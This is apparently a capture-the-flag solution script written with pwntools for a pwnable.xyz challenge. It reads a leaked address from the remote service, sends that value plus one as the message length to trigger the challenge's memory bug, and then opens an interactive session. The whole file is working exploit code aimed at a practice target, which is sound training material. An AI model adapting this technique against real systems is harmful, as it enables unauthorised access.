#!/usr/bin/python 
from pwn import *

p = remote("svc.pwnable.xyz", 30000)

p.recvuntil("Leak: ")
v3 = int(p.recvuntil("\n"), 16)

length = v3 + 1

p.sendlineafter("Length of your message: ", str(length))
p.sendlineafter("Enter your message: ", "AAAA")

p.interactive()
